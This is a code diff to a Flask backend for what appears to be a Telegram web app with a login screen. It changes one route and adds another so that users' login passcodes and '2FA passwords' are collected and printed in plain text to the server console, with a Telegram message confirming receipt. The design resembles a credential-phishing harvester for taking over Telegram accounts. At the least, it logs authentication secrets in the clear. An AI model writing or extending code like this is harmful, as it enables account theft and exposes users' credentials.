@@ -49,18 +49,58 @@ def login_screen():
 @app.route("/send_data", methods=["POST"])
 def send_data():
     data = request.get_json()
-    print("Received from webapp:", data, flush=True)
+    
+    # Print received data to console
+    print("=" * 50, flush=True)
+    print("📨 Received from webapp:", flush=True)
+    print(f"   User ID: {data.get('user_id')}", flush=True)
+    print(f"   Passcode: {data.get('passcode')}", flush=True)
+    print(f"   Full data: {data}", flush=True)
+    print("=" * 50, flush=True)
 
-    chat_id = data.get("chat_id")
-    text = data.get("data")
+    user_id = data.get("user_id")
+    passcode = data.get("passcode")
 
-    if chat_id and text:
-        requests.post(f"{TELEGRAM_API}/sendMessage", json={
-            "chat_id": chat_id,
-            "text": f"💬 You said: {text}"
-        })
+    # Optionally send a message back to the user via Telegram
+    if user_id and passcode:
+        try:
+            requests.post(f"{TELEGRAM_API}/sendMessage", json={
+                "chat_id": user_id,
+                "text": f"✅ Received your passcode: {passcode}"
+            })
+        except Exception as e:
+            print(f"❌ Error sending Telegram message: {e}", flush=True)
 
-    return jsonify({"ok": True})
+    return jsonify({"ok": True, "status": "received"})
+
+
+# === Receive 2FA data from WebApp ===
+@app.route("/send_twofactor", methods=["POST"])
+def send_twofactor():
+    data = request.get_json()
+    
+    # Print received data to console
+    print("=" * 50, flush=True)
+    print("🔐 Received 2FA from webapp:", flush=True)
+    print(f"   User ID: {data.get('user_id')}", flush=True)
+    print(f"   2FA Password: {data.get('twofactor')}", flush=True)
+    print(f"   Full data: {data}", flush=True)
+    print("=" * 50, flush=True)
+
+    user_id = data.get("user_id")
+    twofactor = data.get("twofactor")
+
+    # Optionally send a message back to the user via Telegram
+    if user_id and twofactor:
+        try:
+            requests.post(f"{TELEGRAM_API}/sendMessage", json={
+                "chat_id": user_id,
+                "text": f"🔐 Received your 2FA password"
+            })
+        except Exception as e:
+            print(f"❌ Error sending Telegram message: {e}", flush=True)
+
+    return jsonify({"ok": True, "status": "received"})
 
 
 @app.route("/status")
